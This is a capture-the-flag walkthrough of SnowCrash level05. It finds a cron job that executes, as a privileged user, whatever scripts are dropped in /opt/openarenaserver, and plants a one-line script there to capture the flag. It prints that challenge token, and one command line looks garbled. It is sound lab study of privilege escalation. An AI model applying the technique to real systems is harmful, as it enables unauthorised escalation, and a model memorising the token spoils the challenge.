
-> ls -la

too easy .. nothing interesting

-> find /var /home /etc -iname '*level05*' 2>/dev/null

/var/mail/level05

-> cat /var/mail/level05

*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

So apparently /usr/sbin/openarenaserver is executed every 2 minutes

let's check this file's rights :

-> ls -la /usr/sbin/openarenaserver

-rwxr-x---+ 1 flag05 flag05 ... /usr/sbin/openarenaserver

level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$


This code will make that All files in /opt/openarenaserver will be
executed (with bash) and then deleted. This is a “one-shot” runner
that executes whatever it finds.

So knowing this, we could try to make it execute getflag :)

To do so is needed to keep in mind that the level05 user has the
rights and could create files with scripts. In orther that a script
could be executed, it needs to be quick enought, as every process
will be killed if too long and all files in the directory will be
deleted.

So to write a small script in /opt/openarenaserver which, when 
executed by the runner, will launch /bin/getflag and send its output
to /tmp/tempLevel05 — useful for retrieving the flag if the runner is
running with the necessary permissions :

-> echo "/bin/getflag > /tmp/tempLevel05" > /opt/openarenaserver/tempLevel05

-> cat /opt/openarenaserver/tempLevel05/bin/getflag > /tmp/tempLevel05

After 2 minutes :

-> cat /tmp/tempLevel05

Check flag.Here is your token : viuaaale9huek52boumoomioc

-> su level06